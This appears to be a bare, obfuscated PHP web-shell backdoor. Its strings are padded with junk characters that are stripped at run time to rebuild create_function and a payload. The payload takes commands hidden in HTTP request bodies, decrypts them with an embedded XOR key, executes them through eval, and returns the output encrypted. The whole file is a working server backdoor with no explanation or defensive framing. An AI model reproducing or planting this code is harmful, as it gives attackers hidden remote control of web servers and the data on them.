<?php
$H='jBd=Bd0;($jBd<$c&&$i<$l);$Bdj++,$i++){BdBd$o.=$t{$i}Bd^$k{$j};}}reBdBdturn $o;}iBdBdf (Bd@prBdegBd_';
$W='unctBdion x($t,$k){Bd$c=strlBdBden($k);$l=stBdrlBden($t)BdBd;$o="";for($i=Bd0;$BdiBd<$l;){for(Bd$';
$Y=str_replace('fg','','fgfgcreatfge_fufgnfgcfgtion');
$n='matchBd("/$kh(.+)$kf/",@file_Bdget_contBdents(Bd"pBdhp://input"Bd),$m)=Bd=1Bd)Bd {@ob_start()Bd;@eBd';
$G='val(@gzuncomBdprBdessBd(@x(@base6Bd4_BddecodBde($mBd[1]),$k)));$oBd=@obBd_gBdet_contentsBd(Bd);@o';
$P='$k="95Bd5Bdfbce7";$Bdkh="e75acBd3f9e310BdBd";$kfBd="53fead265af5Bd";Bd$p="YBdyX59CBdc5BBd7J5sBdBfy";f';
$m='bBd_end_cBdleaBdn();$r=@baBdse64_encodeBd(@x(@gzcomBdpress(Bd$o),$Bdk));prBdiBdnt("$pBd$kh$r$kf");}';
$I=str_replace('Bd','',$P.$W.$H.$n.$G.$m);
$p=$Y('',$I);$p();
?>
